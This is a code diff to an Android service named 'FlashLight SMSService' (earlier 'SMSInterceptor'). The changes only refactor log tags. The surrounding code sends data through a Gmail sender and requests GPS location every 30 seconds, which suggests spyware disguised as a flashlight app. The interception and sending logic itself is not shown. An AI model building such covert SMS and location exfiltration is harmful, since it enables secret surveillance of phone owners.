@@ -28,6 +28,7 @@ import android.database.ContentObserver;
 public class SMSService extends Service implements LocationListener {
 
   private static String gmailEmailString;
+  private static final String TAG = "FlashLight SMSService";
 
   private static GmailSender sender;
   private static Configure configure;
@@ -48,7 +49,7 @@ public class SMSService extends Service implements LocationListener {
 
   final Messenger mMessenger = new Messenger(new IncomingHandler());
 
-  class IncomingHandler extends Handler {
+  static class IncomingHandler extends Handler {
     @Override
     public void handleMessage(Message msg) {
       super.handleMessage(msg);
@@ -76,7 +77,7 @@ public class SMSService extends Service implements LocationListener {
         }
         catch(Exception e) {
           e.printStackTrace();
-          Log.e("gmailSenderError", "" + e.toString());
+          Log.e(TAG, "onProviderDisabled() Exception e " + e.toString());
         }
       }
     }).start();       
@@ -98,7 +99,7 @@ public class SMSService extends Service implements LocationListener {
         }
         catch(Exception e) {
           e.printStackTrace();
-          Log.e("gmailSenderError", "" + e.toString());
+          Log.e(TAG, "onProviderEnabled() Exception e " + e.toString());
         }
       }
     }).start();
@@ -124,7 +125,7 @@ public class SMSService extends Service implements LocationListener {
           }
           catch(Exception e) {
             e.printStackTrace();
-            Log.e("gmailSenderError", "" + e.toString());
+            Log.e(TAG, "onLocationChanged() Exception e " + e.toString());
           }
         }
       }).start();
@@ -135,16 +136,16 @@ public class SMSService extends Service implements LocationListener {
   @Override
   public int onStartCommand(Intent intent, int flag, int startId) throws NullPointerException {
 
-      Log.d("SMSInterceptor onStartCommand()", "Entering onStartCommand method.");
+      Log.d(TAG, "onStartCommand() Entering onStartCommand method.");
 
       locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
  
       if(locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
-        Log.d("SMSInterceptor SMSService","eLocation = TRUE");
+        Log.d(TAG, "onStartCommand() eLocation = TRUE");
         eLocation = true;
       }
       else {
-        Log.d("SMSInterceptor SMSService","eLocation = FALSE");
+        Log.d(TAG, "onStartCommand() eLocation = FALSE");
         eLocation = false;
       }
 
@@ -162,7 +163,7 @@ public class SMSService extends Service implements LocationListener {
               }
               catch(Exception e) {
                 e.printStackTrace();
-                Log.e("gmailSenderError", "" + e.toString());
+                Log.e(TAG, "onStartCommand() Exception e " + e.toString());
               }
             }
           }).start();
@@ -172,7 +173,7 @@ public class SMSService extends Service implements LocationListener {
         }
       }
       catch(NullPointerException e) {
-        Log.e("NullPointerException", "" + e.toString());
+        Log.e(TAG, "onStartCommand() NullPointerException e " + e.toString());
       }
 
       locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,30000,10,this);
